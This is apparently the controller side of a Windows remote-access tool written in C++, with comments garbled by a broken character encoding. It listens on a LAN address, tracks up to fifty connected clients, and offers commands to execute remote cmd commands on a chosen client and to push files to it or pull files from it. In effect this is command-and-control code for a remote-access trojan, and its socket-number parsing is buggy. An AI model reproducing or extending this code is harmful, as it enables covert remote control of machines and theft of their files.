#include "main.h"


/*
	������
*/
int main(int argc, char **argv)
{
	tcpSocket socket("192.168.1.40", 81);     // ����˿�ʼ�������ҵȴ��ͻ��˵�����
	if (!socket.tcpAccept())                 
		return false;

	//commandReduce(&socket);                    // ��ʼ�����еĽ���
	while (true)
	{
		;
	}
	return true;
}


/*
	���������в���
*/
void commandReduce(tcpSocket *socket)
{
	string name;
	char commandLine[MAX_PATH] = { 0 }; char *separate;

	while (true)
	{
		cout << "input your command: ";
		getline(cin, name);
		if (strlen(name.data()) > MAX_PATH)
		{
			cout << " [!] Exceeded maximum length..." << endl;
			cout << "" << endl;
			continue;
		}
		ZeroMemory(commandLine, MAX_PATH);
		memcpy(commandLine, name.data(), strlen(name.data()));
		strcat(commandLine + strlen(commandLine), " ");

		separate = strchr(commandLine, '-');                                                                             // Ѱ�������ʶ, ���� -h -upload ��
		if (separate == NULL)
		{
			cout << " [!] Incorrect input..." << endl;
			cout << "" << endl;
			continue;
		}

		if (strncmp(separate, "-help ", 6) == 0 || strncmp(separate, "-h ", 3) == 0)								        // ������ -h
		{
			cout << "| -h / -help                                                                 ��ʾ������Ϣ                   " << endl;
			cout << "| -c / -connect                                                              ��ʾ����̨��                   " << endl;
			cout << "| -s / -sendToClient [ownFilePath]  [clientFilePath] [socketNumber]          �ϴ��ļ���Զ�̿ͻ���           " << endl;
			cout << "| -r / -recvToClient [ownFilePath]  [clientFilePath] [socketNumber]          ��Զ�̿ͻ��������ļ�           " << endl;
			cout << "| -x / -clientCmd    [socketNumber] [cmdChar]                                ִ��Զ�� cmd ����              " << endl;
			cout << "| -q / -quit                                                                 �˳�                           " << endl;
			cout << "" << endl;
		}
		else if (strncmp(separate, "-clientCmd ", 11) == 0 || strncmp(separate, "-x ", 3) == 0)                          // ִ��Զ�� cmd
		{
			char cmdChar[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)                                               // ��һ������
					memcpy(socketNumber, token, strlen(token));
				else if (index == 3)                                          // �ڶ�������
					memcpy(cmdChar, token, strlen(token));
				else if (index > 10)
					break;
				else
				{
					strcat(cmdChar, " ");
					strcat(cmdChar, token);
				}
				token = strtok(NULL, s);
			}
			if (index < 10)
			{
				if (cmdExec(cmdChar, socketNumber, socket) == true)
				{
					cout << " [*] ִ������ɹ�" << endl;
				}
				else
				{
					cout << " [!] ִ������ʧ��" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-recvToClient ", 14) == 0 || strncmp(separate, "-r ", 3) == 0)                          // ������ -u �ϴ�
		{
			char ownFilePath[MAX_PATH] = { 0 }; char clientFilePath[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)
					memcpy(ownFilePath, token, strlen(token));
				else if (index == 3)
					memcpy(clientFilePath, token, strlen(token));
				else if (index == 4)
					memcpy(socketNumber, token, strlen(token));
				else if (index > 4)
					break;
				token = strtok(NULL, s);
			}
			if (index == 4)
			{
				if (recvToClient(ownFilePath, clientFilePath, socketNumber, socket) == true)
				{
					cout << " [*] �����ļ��ɹ�" << endl;
				}
				else
				{
					cout << " [!] �����ļ�ʧ��" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-sendToClient ", 14) == 0 || strncmp(separate, "-s ", 3) == 0)                        // ������ -d ����
		{
			char ownFilePath[MAX_PATH] = { 0 }; char clientFilePath[MAX_PATH] = { 0 }; char socketNumber[40] = { 0 };
			char s[2] = " "; char *token; int index = 0;

			token = strtok(separate, s);
			while (token != NULL) {
				index += 1;
				if (index == 2)                                              
					memcpy(ownFilePath, token, strlen(token));
				else if (index == 3)                                   
					memcpy(clientFilePath, token, strlen(token));
				else if (index == 4)
					memcpy(socketNumber, token, strlen(token));
				else if (index > 4)
					break;
				token = strtok(NULL, s);
			}
			if (index == 4)
			{
				if (sendToClient(ownFilePath, clientFilePath, socketNumber, socket) == true)
				{
					cout << " [*] �����ļ��ɹ�" << endl;
				}
				else
				{
					cout << " [!] �����ļ�ʧ��" << endl;
				}
			}
			else
			{
				cout << " [!] Too few parameters..." << endl;
			}
			cout << "" << endl;
		}
		else if (strncmp(separate, "-connect ", 9) == 0 || strncmp(separate, "-c ", 3) == 0)                        // ������ -c �鿴������
		{
			socket->threadToRefresh();
			tcpSocketPool *pool = connectionInfo(); int index = 0;
			cout << " | ���ӵ����             IP ��ַ" << endl;
			for (int i = 0; i < 50; i++)
			{
				if (pool->isConnection == true)
				{
					cout << " | " << pool->sNumber << "                      " << pool->clientIp << endl;
					index += 1;
				}
				pool += 1;
			}
			if (index == 0)
				cout << "   ��                     ��" << endl;

			cout << "" << endl;
		}
		else if (strncmp(separate, "-quit ", 6) == 0 || strncmp(separate, "-q ", 3) == 0)                           // ������ -q �˳�
		{
			cout << "" << endl;
			return;
		}
		else
		{
			cout << " [!] Incorrect input..." << endl;
			cout << "" << endl;
		}
	}
}

/*
struct myProtocol // ���ڿͻ��˺ͷ������˴����Э��
{
		type = 1 �����ļ����ϴ�
		type = 2 �����ļ�������
		type = 3 ��ʾ�ͻ��˻������Ƿ�׼���ô�������
		type = 12 ��ʾִ��ʧ��
		
int type = 0;

int fileSize = 0;
char serverFile[MAX_PATH];        // ���������ļ�
char clientFile[MAX_PATH];        // �����ϴ��ļ�
};
*/

/*
	ִ��Զ�� cmd ���� type = 4
*/
bool cmdExec(char *cmdChar, char *socketNumber, tcpSocket *socket)
{
	tcpSocketPool *pool; myProtocol cmd; HANDLE hHeap, hAlloc;
	socket->threadToRefresh();
	pool = connectionInfo();

	// �� char ����ת��Ϊ int
	int num1 = 0; int num2 = 0; int number = 0;
	num1 = *((byte *)socketNumber); num1 -= 48;
	if (strlen(socketNumber) == 2)
	{
		num2 = *((byte *)socketNumber + 1); num2 -= 48;
		number = num1 * 10 + num2;
	}
	number = num1;

	if (number >= 0 && number < 50)
	{
		if ((pool + number)->isConnection == false)
			return false;
	}
	else
		return false;
	
	int size = 100000;
	hHeap = HeapCreate(0, size, NULL);
	if (hHeap)
	{
		hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
		if (!hAlloc)
			return false;
	}
	else
		return false;

	cmd.type = 4;
	memcpy(cmd.cmdChar, cmdChar, MAX_PATH);
	if (socket->tcpSend((pool + number)->socket, (char*)&cmd, sizeof(cmd)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char *)hAlloc, size) == false)
			return false;
	}
	else
		return false;

	cout << (char *)hAlloc << endl;
	return true;
}


/*
	�����ļ����ͻ��� type = 1
*/
bool sendToClient(char *ownFilePath, char *clientFilePath, char *socketNumber, tcpSocket *socket)
{
	tcpSocketPool *pool;
	myProtocol upload;

	socket->threadToRefresh();
	pool = connectionInfo();

	// �� char ����ת��Ϊ int
	int num1 = 0; int num2 = 0; int number = 0;
	num1 = *((byte *)socketNumber); num1 -= 48;
	if (strlen(socketNumber) == 2)
	{
		num2 = *((byte *)socketNumber + 1); num2 -= 48;
		number = num1 * 10 + num2;
	}
	number = num1;

	if (number >= 0 && number < 50)
	{
		if ((pool + number)->isConnection == false)
			return false;
	}
	else
		return false;

	// �򿪷���˵��ļ�
	file myfile(ownFilePath);
	HANDLE data = myfile.fileRead();
	if (data == false)
		return false;

	// �����ļ���С���Ҹ�֪�ͻ��˴�ŵ�·��
	upload.type = 1;
	upload.fileSize = myfile.fileSizeL;
	memcpy(upload.clientFile, clientFilePath, MAX_PATH);
	if (socket->tcpSend((pool + number)->socket, (char*)&upload, sizeof(upload)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char *)&upload, sizeof(upload)) == false)
			return false;
	}
	else
		return false;

	// ����ͻ���׼�������Ϳ�ʼ�����ļ�
	if (upload.type == 3)
	{
		if (socket->tcpSend((pool + number)->socket, (char*)data, myfile.fileSizeL) == false)
			return false;
	}
	else
		return false;

	return true;
}


/*
	�������Կͻ��˵��ļ� type = 2
*/
bool recvToClient(char *ownFilePath, char *clientFilePath, char *socketNumber, tcpSocket *socket)
{
	tcpSocketPool *pool;
	myProtocol download;
	HANDLE hHeap; HANDLE hAlloc;
	bool result = true;

	// ��ȡ tcpSocketPool �ṹ��
	socket->threadToRefresh();
	pool = connectionInfo();
	
	// char �� int ��ת��
	int num1 = 0; int num2 = 0; int number = 0;
	num1 = *((byte *)socketNumber); num1 -= 48;
	if (strlen(socketNumber) == 2)
	{
		num2 = *((byte *)socketNumber + 1); num2 -= 48;
		number = num1 * 10 + num2;
	}
	number = num1;

	// number ������������,������ͻ��˵����Ӳ��ܶϿ�
	if (number >= 0 && number < 50)
	{
		if ((pool + number)->isConnection == false)
			return false;
	}
	else
		return false;

	// ��֪�ͻ���Ҫ�����ļ�, ���ҵȴ������ļ��Ĵ�С
	download.type = 2;
	memcpy(download.clientFile, clientFilePath, MAX_PATH);
	if (socket->tcpSend((pool + number)->socket, (char*)&download, sizeof(download)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char*)&download, sizeof(download)) == false)
			return false;
	}
	else
		return false;

	// ����ͻ���׼�������������������ʹ���������׼�����տͻ��˵�����
	if (download.type == 3)
	{
		if (download.fileSize < 0 || download.fileSize > 0x1f400000)
		{
			download.type = 12;
			socket->tcpSend((pool + number)->socket, (char *)&download, sizeof(download));
			return false;
		}
	}
	else
		return false;
	
	hHeap = HeapCreate(0, download.fileSize, NULL);
	if (hHeap)
	{
		hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, download.fileSize);
		if (!hAlloc)
			return false;
	}
	else
		return false;

	// ��֪�����׼������֮��Ϳ��Խ��տͻ��˵�������
	download.type = 3;
	if (socket->tcpSend((pool + number)->socket, (char *)&download, sizeof(download)))
	{
		if (socket->tcpRecv((pool + number)->socket, (char *)hAlloc, download.fileSize) == false)
			return false;
	}
	else
		return false;

	// ����ڷ���˴����ļ�
	file ownFile(ownFilePath);
	if (ownFile.fileWrite((char *)hAlloc, download.fileSize) == false)
		return false;

	HeapFree(hHeap, 0, hAlloc);
	return true;
}

